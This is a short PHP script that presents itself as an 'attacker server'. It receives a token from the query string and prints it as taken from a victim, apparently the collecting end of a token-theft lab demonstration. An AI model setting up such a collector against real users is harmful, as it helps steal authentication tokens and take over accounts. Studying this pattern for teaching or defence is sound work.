<?php 
    echo "<h1> This is the attacker server </h1>";
    $token = $_GET['token'] ?? 'no-token';
    echo "Token is taken from victim: $token";
?>